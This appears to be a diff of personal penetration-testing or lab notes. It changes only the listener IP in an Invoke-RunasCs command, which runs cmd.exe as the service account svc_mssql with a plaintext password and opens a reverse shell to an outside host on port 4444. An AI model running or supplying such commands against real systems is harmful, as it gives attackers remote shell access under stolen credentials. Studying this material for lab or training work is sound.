@@ -1,7 +1,7 @@
 [[Editing Copy Page]]
 
 ```
-Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command cmd.exe -Remote 192.168.45.159:4444
+Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command cmd.exe -Remote 192.168.45.176:4444
 ```
 
 ```
